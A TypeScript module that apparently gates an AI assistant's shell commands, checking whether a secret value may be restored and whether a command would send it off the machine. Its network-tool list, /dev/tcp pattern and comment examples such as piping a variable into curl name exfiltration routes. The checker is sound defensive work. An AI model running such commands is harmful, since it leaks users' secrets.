// Should this shell command get a real value, and would it carry one off the machine?
//
// Pure and table-tested. Both checks read the command AFTER tickets were swapped
// back for real values, plus where those values sit in it. Two gates, both must
// pass before a value is restored into Bash:
//   localProof: every program on the line is on a short local-only list (a
//     positive reason to restore; a wrapper, interpreter, package runner or a
//     variable as the program is not proven and is held);
//   classifyEgress: nothing on the line points at the network (defence in depth
//     for the local list: `echo v > /dev/tcp/...`, a remote URL beside the value).
// Neither is a sandbox: a command that sends a secret by a route they do not
// see (an environment variable, a script file) passes.

export type Egress = { via: string; to: string }
type Span = { start: number; end: number }

/** Programs whose job is talking to another machine. */
const NET = new Set([
  'curl', 'wget', 'nc', 'ncat', 'netcat', 'socat', 'telnet', 'ssh', 'scp', 'sftp', 'ftp', 'rsync',
  'http', 'https', 'xh', 'aria2c', 'gh',
])
/** git subcommands that reach a remote. */
const GIT_NET = new Set(['push', 'fetch', 'pull', 'clone', 'ls-remote', 'remote', 'send-email', 'request-pull', 'submodule'])
/** Words that run the next word as the command. */
const WRAPPERS = new Set(['sudo', 'doas', 'env', 'exec', 'command', 'builtin', 'nohup', 'time', 'nice', 'stdbuf', 'timeout', 'xargs', 'busybox', 'then', 'do', 'else', '!'])

const URL_RE = /\bhttps?:\/\/[^\s'"<>|;&)`\\]{1,2048}/gi

function isLocalHost(host: string): boolean {
  const h = host.toLowerCase().replace(/^\[|\]$/g, '')
  return h === 'localhost' || h.endsWith('.localhost') || h === '::1' || h === '0.0.0.0' || /^127\.\d+\.\d+\.\d+$/.test(h)
}

function hostOf(url: string): string {
  try {
    return new URL(url).hostname || 'an unknown host'
  } catch {
    const m = /^[a-z]+:\/\/(?:[^@/]*@)?([^/:?#]+)/i.exec(url)
    return m?.[1] ?? 'an unknown host'
  }
}

type Segment = { start: number; end: number }

/**
 * Splits a command line at `| || && ; & ( ) $( \``, and newlines, outside
 * single and double quotes; a `$(` or backtick inside double quotes still
 * starts a command, as the shell runs it.
 */
export function segments(command: string): Segment[] {
  const out: Segment[] = []
  let start = 0
  let quote: '"' | "'" | null = null
  const cut = (at: number, skip: number) => {
    if (at > start) out.push({ start, end: at })
    start = at + skip
  }
  for (let i = 0; i < command.length; i++) {
    const c = command[i]
    if (quote === "'") {
      if (c === "'") quote = null
      continue
    }
    if (c === '\\') {
      i++
      continue
    }
    if (quote === '"') {
      if (c === '"') quote = null
      else if (c === '`') cut(i, 1)
      else if (c === '$' && command[i + 1] === '(') {
        cut(i, 2)
        i++
      }
      continue
    }
    if (c === '"' || c === "'") quote = c
    else if (c === '|' || c === '&' || c === ';' || c === '\n' || c === '(' || c === ')' || c === '`' || c === '{' || c === '}') cut(i, 1)
    else if (c === '$' && command[i + 1] === '(') {
      cut(i, 2)
      i++
    }
  }
  cut(command.length, 0)
  return out
}

/** The words of one simple command, as a shell splits them: quotes join, backslash escapes. */
function words(text: string): string[] {
  const out: string[] = []
  let word = ''
  let isWord = false
  let quote: string | null = null
  for (let i = 0; i < text.length; i++) {
    const c = text[i]!
    if (quote !== null) {
      if (c === quote) quote = null
      else word += c
      continue
    }
    if (c === '"' || c === "'") {
      quote = c
      isWord = true
    } else if (c === '\\' && i + 1 < text.length) {
      word += text[++i]
      isWord = true
    } else if (/\s/.test(c)) {
      if (isWord) out.push(word)
      word = ''
      isWord = false
    } else {
      word += c
      isWord = true
    }
  }
  if (isWord) out.push(word)
  return out
}

/** Wrapper flags that take the next word as their value (`sudo -u me`, `nice -n 5`). */
const FLAG_WITH_VALUE = new Set(['-u', '-g', '-n', '-C', '-D', '-p', '-U', '-r', '-t', '-S', '-s', '-k', '-h', '-I', '-L', '-P'])

/** The program a simple command runs, past `FOO=bar`, `sudo -u x`, `env`, `timeout 5`. */
export function commandOf(text: string): { name: string; args: string[] } | undefined {
  const ws = words(text)
  let i = 0
  while (i < ws.length) {
    const w = ws[i]!
    if (/^[A-Za-z_][A-Za-z0-9_]*=/.test(w)) {
      i++
      continue
    }
    const base = (w.split('/').pop() ?? w).toLowerCase()
    if (WRAPPERS.has(base)) {
      i++
      // the wrapper's own flags, their values and numbers (sudo -u me, timeout 30, nice -n 5)
      while (i < ws.length && /^(?:-\S*|\d+(?:\.\d+)?[smhd]?)$/.test(ws[i]!)) {
        i += FLAG_WITH_VALUE.has(ws[i]!) ? 2 : 1
      }
      continue
    }
    return { name: base, args: ws.slice(i + 1) }
  }
  return undefined
}

/** Where a network program is pointed: a URL's host, `user@host:`, or its first operand. */
function targetOf(name: string, args: string[], text: string): string {
  URL_RE.lastIndex = 0
  const url = URL_RE.exec(text)
  if (url) return hostOf(url[0])
  if (name === 'gh') return 'github.com'
  for (const a of args) {
    if (a.startsWith('-')) continue
    const remote = /^(?:[^@\s/]+@)?([A-Za-z0-9.-]+\.[A-Za-z]{2,}|localhost|\d+\.\d+\.\d+\.\d+)(?::|$)/.exec(a)
    if (remote) return remote[1]!
  }
  for (const a of args) if (!a.startsWith('-')) return a.slice(0, 80)
  return 'an unknown host'
}

/** git's subcommand and the words after it, past `-c key=value`, `-C dir` and other options. */
function gitSub(args: string[]): { sub: string; rest: string[] } | undefined {
  for (let i = 0; i < args.length; i++) {
    const a = args[i]!
    if (a === '-c' || a === '-C' || a === '--git-dir' || a === '--work-tree') {
      i++
      continue
    }
    if (!a.startsWith('-')) return { sub: a, rest: args.slice(i + 1) }
  }
  return undefined
}

/**
 * Programs whose own work stays on this machine: text and file tools that run
 * no other program (so not `sort`, whose --compress-program runs one). A real value is restored into a Bash command only when every
 * program on the line is one of these (see localProof). Shells, interpreters,
 * package runners, `find`, `xargs`'s target and anything unknown are left out on
 * purpose: they can run or send whatever they are handed.
 */
export const LOCAL = new Set([
  'echo', 'printf', 'cat', 'tee', 'head', 'tail', 'wc', 'uniq', 'cut', 'tr', 'rev', 'fold', 'paste', 'column',
  'grep', 'egrep', 'fgrep', 'cmp', 'diff', 'comm', 'jq',
  'test', '[', '[[', 'true', 'false', ':', 'cp', 'mv', 'mkdir', 'rmdir', 'touch', 'ls', 'stat', 'chmod', 'chown', 'ln',
  'readlink', 'realpath', 'basename', 'dirname', 'pwd', 'cd', 'date', 'sleep',
  'base64', 'xxd', 'od', 'hexdump', 'md5sum', 'sha1sum', 'sha256sum', 'shasum',
  'export', 'unset', 'set', 'local', 'declare', 'typeset', 'readonly', 'shift', 'return', 'break', 'continue', 'exit', 'read', 'wait', 'umask',
])
/** Shell words that structure a line and run nothing themselves; their bodies are checked as their own segments. */
const KEYWORDS = new Set(['if', 'then', 'elif', 'else', 'fi', 'for', 'while', 'until', 'do', 'done', 'case', 'esac', 'in', 'select', 'function'])

export type LocalProof = { ok: true } | { ok: false; program: string }

/**
 * Whether every program `command` runs is on the local-only list, so a real
 * value may be restored into it. Heredoc bodies are data, not commands. A
 * line with no program (assignments alone, a comment) is local. The first
 * program that is not proven local is named, so the hold can say why.
 */
export function localProof(command: string): LocalProof {
  const data = heredocBodies(command)
  for (const seg of segments(command)) {
    if (data.some(d => d.start <= seg.start && seg.start < d.end)) continue
    const text = command.slice(seg.start, seg.end)
    const cmd = commandOf(text)
    if (!cmd) continue
    if (cmd.name.startsWith('#')) continue // a comment to the end of the segment
    if (KEYWORDS.has(cmd.name)) {
      // `for x in a b`, `if test -f x`: the words after a keyword may be a command of their own.
      if (cmd.name === 'if' || cmd.name === 'elif' || cmd.name === 'while' || cmd.name === 'until') {
        const inner = localProof(cmd.args.join(' '))
        if (!inner.ok) return inner
      }
      continue
    }
    if (!LOCAL.has(cmd.name)) return { ok: false, program: cmd.name }
  }
  return { ok: true }
}

/**
 * The spans of heredoc bodies (`<<EOF` to the line that is `EOF`): data the
 * shell never runs. Only a `<<` outside quotes and not escaped opens one: a
 * quoted `'<<EOF'` is a plain word, and the lines after it are commands.
 */
function heredocBodies(command: string): Span[] {
  const out: Span[] = []
  const open = /^<<-?\s*(['"]?)([A-Za-z_][A-Za-z0-9_]*)\1/
  let quote: '"' | "'" | null = null
  for (let i = 0; i < command.length; i++) {
    const c = command[i]
    if (c === '\\') {
      i++
      continue
    }
    if (quote !== null) {
      if (c === quote) quote = null
      continue
    }
    if (c === '"' || c === "'") {
      quote = c
      continue
    }
    if (c !== '<' || command[i + 1] !== '<') continue
    const m = open.exec(command.slice(i))
    if (!m) continue
    const word = m[2]!
    const lineEnd = command.indexOf('\n', i)
    if (lineEnd < 0) break
    const lines = command.slice(lineEnd + 1).split('\n')
    let end = command.length
    let at = lineEnd + 1
    for (const line of lines) {
      if (line.replace(/^\t+/, '') === word) {
        end = at + line.length // the terminator line is part of the heredoc, not a command
        break
      }
      at += line.length + 1
    }
    out.push({ start: lineEnd + 1, end })
    i = end // the next heredoc, if any, starts after this body
    quote = null
  }
  return out
}

/**
 * What the hold names must never be the secret: a target or program word
 * that overlaps a value is replaced. The band, the toast and Claude's deny
 * text show only these and the tickets' labels.
 */
function named(egress: Egress, values: readonly string[]): Egress {
  return {
    via: leaksValue(egress.via, values) ? 'a program in the command' : egress.via,
    to: leaksValue(egress.to, values) ? 'a host named in the command' : egress.to,
  }
}

/** Whether a word drawn on screen would show a secret value, or a telling piece of one. */
export function leaksValue(word: string, values: readonly string[]): boolean {
  return values.some(v => v.length > 0 && (word.includes(v) || (word.length >= 4 && v.includes(word))))
}

/**
 * Whether `command`, which holds secret values at `secrets`, would send them
 * off this machine: a URL that carries one; a network program (curl, wget,
 * nc, ssh, scp, rsync to a remote, git push and kin) anywhere in the command
 * line, pipes included; bash's /dev/tcp; or any non-local URL beside them.
 * Null when it would not, or when it carries no value at all.
 */
export function classifyEgress(command: string, secrets: readonly Span[]): Egress | null {
  if (secrets.length === 0) return null
  const found = findEgress(command, secrets)
  return found && named(found, secrets.map(s => command.slice(s.start, s.end)))
}

function findEgress(command: string, secrets: readonly Span[]): Egress | null {
  const urls: { start: number; end: number; host: string }[] = []
  URL_RE.lastIndex = 0
  for (let m = URL_RE.exec(command); m !== null; m = URL_RE.exec(command)) {
    urls.push({ start: m.index, end: m.index + m[0].length, host: hostOf(m[0]) })
  }

  // 1. A value inside a URL leaves with the request, whatever runs it.
  for (const u of urls) {
    if (isLocalHost(u.host)) continue
    if (secrets.some(s => s.start < u.end && s.end > u.start)) {
      const seg = segments(command).find(g => g.start <= u.start && u.start < g.end)
      const via = seg ? commandOf(command.slice(seg.start, seg.end))?.name : undefined
      return { via: via ?? 'a URL', to: u.host }
    }
  }

  // 2. A network program anywhere on the line: `echo $V | curl -d @- host` sends V.
  for (const seg of segments(command)) {
    const text = command.slice(seg.start, seg.end)
    const cmd = commandOf(text)
    if (!cmd) continue
    if (cmd.name === 'git') {
      const git = gitSub(cmd.args)
      if (git && GIT_NET.has(git.sub)) return { via: `git ${git.sub}`, to: targetOf('git', git.rest, text) }
      continue
    }
    if (!NET.has(cmd.name)) continue
    if (cmd.name === 'rsync' && !cmd.args.some(a => /^[^-/][^/]*:|^rsync:\/\//.test(a))) continue // local copy
    const to = targetOf(cmd.name, cmd.args, text)
    if (isLocalHost(to)) continue // this machine talking to itself
    return { via: cmd.name, to }
  }

  // 3. bash's own network: > /dev/tcp/host/port
  const tcp = /\/dev\/(?:tcp|udp)\/([^/\s]+)\//.exec(command)
  if (tcp) return { via: '/dev/tcp', to: tcp[1]! }

  // 4. A script or program handed a remote URL alongside the value.
  const remote = urls.find(u => !isLocalHost(u.host))
  if (remote) return { via: 'a URL in the command', to: remote.host }
  return null
}
